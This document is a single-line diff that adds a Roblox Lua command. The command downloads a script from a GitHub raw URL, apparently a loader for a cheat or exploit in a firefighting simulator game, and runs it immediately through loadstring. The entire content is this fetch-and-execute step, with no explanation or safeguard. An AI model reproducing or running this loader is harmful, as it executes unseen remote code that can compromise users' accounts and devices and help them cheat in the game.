@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/firefighting-sim-spam7-4v6l27bnjp59gu.lua"))()
